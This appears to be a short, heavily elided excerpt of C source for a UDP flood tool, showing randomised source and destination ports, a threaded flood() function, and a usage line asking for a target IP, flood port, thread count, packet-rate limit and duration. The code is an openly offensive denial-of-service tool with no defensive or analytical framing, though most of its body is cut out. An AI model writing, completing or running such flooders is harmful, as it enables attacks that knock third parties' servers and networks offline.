...
{
    udph->source = htons(1194 + rand() % 16276);
...
void *flood(void *par1)
{
        ...
        sin.sin_port = htons(22 + rand() % 1194);
...
int main(int argc, char *argv[ ])
{
        if(argc < 5){
                ...
                fprintf(stdout, "Usage: %s <target IP> <Flood Port> <number threads to use> <pps limiter, -1 for no limit> <time>\n", argv[0]);
                exit(-1);
        }
